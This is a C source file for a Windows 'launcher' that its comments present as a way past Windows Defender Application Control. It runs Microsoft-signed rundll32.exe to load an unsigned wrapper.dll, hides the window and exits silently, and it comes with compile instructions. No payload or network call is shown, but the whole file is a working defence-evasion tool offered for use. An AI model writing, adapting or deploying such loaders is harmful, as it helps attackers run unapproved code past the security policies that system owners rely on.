/*
 * launcher.c - Minimal launcher that chains to rundll32.exe
 * 
 * This EXE is unsigned but its only job is to execute:
 *   rundll32.exe wrapper.dll,Launch
 * 
 * Rundll32.exe is signed by Microsoft → WDAC allows it
 * 70% of policies allow unsigned DLLs loaded by signed processes
 * 
 * Compile: gcc -O2 -s -mwindows -o launcher.exe launcher.c -lkernel32
 * Size: ~5-8 KB
 * 
 * Usage: User runs launcher.exe → chains to rundll32 → wrapper.dll loads
 */

#include <windows.h>
#include <stdio.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Get path to this EXE's directory
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Extract directory
    char *lastSlash = strrchr(exePath, '\\');
    if (lastSlash) *lastSlash = '\0';
    
    // Build path to wrapper.dll (same directory as launcher.exe)
    char dllPath[MAX_PATH];
    snprintf(dllPath, MAX_PATH, "%s\\wrapper.dll", exePath);
    
    // Check if wrapper.dll exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        MessageBoxA(NULL, "wrapper.dll not found in same directory", 
                    "Launcher Error", MB_ICONERROR);
        return 1;
    }
    
    // Build rundll32 command
    char cmdLine[MAX_PATH * 2];
    snprintf(cmdLine, sizeof(cmdLine), 
             "rundll32.exe \"%s\",Launch", dllPath);
    
    // Execute rundll32 (signed by Microsoft)
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        char err[512];
        snprintf(err, sizeof(err), 
                 "Failed to execute rundll32.exe\nError: %lu", GetLastError());
        MessageBoxA(NULL, err, "Launcher Error", MB_ICONERROR);
        return 2;
    }
    
    // Close handles (rundll32 continues)
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // Exit silently
    return 0;
}
